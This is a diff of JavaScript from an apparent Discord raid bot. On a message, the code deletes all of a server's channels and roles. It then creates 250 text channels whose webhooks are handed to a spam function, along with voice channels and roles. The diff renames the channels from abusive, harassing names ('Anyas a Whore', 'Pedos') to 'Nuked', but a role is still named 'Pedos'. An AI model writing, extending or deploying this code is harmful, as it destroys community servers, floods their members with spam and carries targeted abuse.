@@ -112,12 +112,12 @@ this.bot.on("message", async message => {
         message.guild.channels.forEach(channel => channel.delete())
         message.guild.roles.map(r => r.delete().catch(err => {}));
         for (let i = 0; i < 250; i++) { 
-          message.guild.createChannel("Anyas a Whore", {type: "text"}).then(channel =>  { 
+          message.guild.createChannel("Nuked", {type: "text"}).then(channel =>  { 
           channel.createWebhook("Testerrr").then(webhook => { 
 				webhookSpam(webhook);
 				})
 			})
-            message.guild.createChannel("Pedos", {type: "Voice"}).catch("");
+            message.guild.createChannel("Nuked", {type: "Voice"}).catch("");
             message.guild.createRole({ name: `{"type":"error","title":"Pedos"}`, color: "RANDOM", permissions:[]
             })
         }
